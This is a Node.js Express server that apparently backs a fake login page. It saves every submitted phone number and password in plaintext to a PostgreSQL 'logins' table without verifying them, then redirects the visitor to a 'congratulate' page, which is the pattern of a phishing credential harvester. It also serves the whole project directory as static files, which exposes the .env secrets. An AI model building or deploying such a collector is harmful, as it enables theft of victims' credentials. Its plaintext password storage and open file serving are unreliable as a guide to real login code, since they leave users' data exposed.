const express = require('express');
const { Client } = require('pg');
const bodyParser = require('body-parser');
const cors = require('cors');
const dotenv = require('dotenv');

// Load environment variables from .env file
dotenv.config();

const app = express();
const port = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('.')); // Serve static files like HTML and CSS

// PostgreSQL client setup with placeholder connection string
// Replace 'YOUR_POSTGRES_CONNECTION_STRING' with your actual PostgreSQL connection string
const client = new Client({
    connectionString: process.env.DATABASE_LINK,
});

// Connect to PostgreSQL
client.connect()
    .then(() => {
        console.log('Connected to PostgreSQL');
        // Create table if it doesn't exist
        return client.query(`
      CREATE TABLE IF NOT EXISTS logins (
        id SERIAL PRIMARY KEY,
        number VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    })
    .then(() => {
        console.log('Table created or already exists');
    })
    .catch(err => {
        console.error('Connection or table creation error', err);
    });

// Handle POST /login
app.post('/login', (req, res) => {
    const { number, password } = req.body;

    // Insert login data into database
    client.query('INSERT INTO logins (number, password) VALUES ($1, $2)', [number, password])
        .then(() => {
            console.log('Login data inserted');
            // Redirect to congratulate.html
            res.redirect('/congratulate.html');
        })
        .catch(err => {
            console.error('Error inserting data', err);
            res.status(500).send('Internal Server Error');
        });
});

// Serve login.html at root
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

// Start server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
